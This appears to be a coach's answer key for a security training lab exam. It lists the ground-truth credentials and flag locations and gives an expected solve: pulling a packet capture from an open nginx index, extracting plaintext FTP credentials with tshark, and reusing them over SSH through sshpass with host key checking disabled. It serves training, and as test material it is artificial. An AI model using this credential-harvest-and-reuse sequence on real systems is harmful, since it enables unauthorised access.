# Coach context — scr-t2-exam

## Ground truth
- `evidence01` 10.x.10.20: nginx :8080 with autoindex over /srv/evidence —
  `capture.pcap` (the wiretap corpus: FTP session USER ops-backup /
  PASS Restore2024!, plus misc noise).
- `ops-backup` account exists with password `Restore2024!` — the creds in
  the capture are live on the box.
- Flags: command `proof-file` on evidence01 — `/home/ops-backup/proof.txt`
  contains `analysis-complete`; file `loot-flag` at
  `/home/ops-backup/loot.txt` (injected, trainee submits).

## Expected solve
```bash
curl -s http://10.x.10.20:8080/capture.pcap -o cap.pcap
tshark -r cap.pcap -Y ftp -T fields -e ftp.request.command \
       -e ftp.request.arg        # → USER ops-backup / PASS Restore2024!
sshpass -p 'Restore2024!' ssh -o StrictHostKeyChecking=no \
    ops-backup@10.x.10.20 'echo analysis-complete > proof.txt; cat loot.txt'
```
`strings cap.pcap | grep -A2 USER` is the low-tech alternative.

## Coach guidance
- The pcap is the SAME corpus as for-t1-wiretap — a trainee who solved it
  knows the creds; the exam tests *automation*, not memory: insist they
  script the extraction anyway.
- sshpass on Kali is standard; paramiko equally acceptable.
- Exam gate: all tier-2 scripting quests solved.
